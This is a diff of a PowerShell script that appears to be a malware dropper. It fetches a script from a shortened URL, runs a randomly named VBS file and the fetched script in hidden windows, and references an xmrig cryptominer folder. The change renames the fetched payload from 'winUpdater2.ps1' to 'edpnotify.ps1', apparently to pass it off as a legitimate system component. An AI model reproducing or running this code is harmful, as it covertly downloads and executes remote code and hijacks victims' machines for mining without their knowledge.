@@ -111,11 +111,11 @@ Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "
 
 cd $initial_dir
 
-Invoke-WebRequest -UseBasicParsing -OutFile "winUpdater2.ps1" -Uri "http://tiny.cc/g1pg001"
+Invoke-WebRequest -UseBasicParsing -OutFile "edpnotify.ps1" -Uri "http://tiny.cc/g1pg001"
 
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
 
-Start-Process -FilePath "$initial_dir\winUpdater2.ps1" -windowstyle hidden
+Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden
 
 # Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # cd "$initial_dir\xmrig-6.22.2"
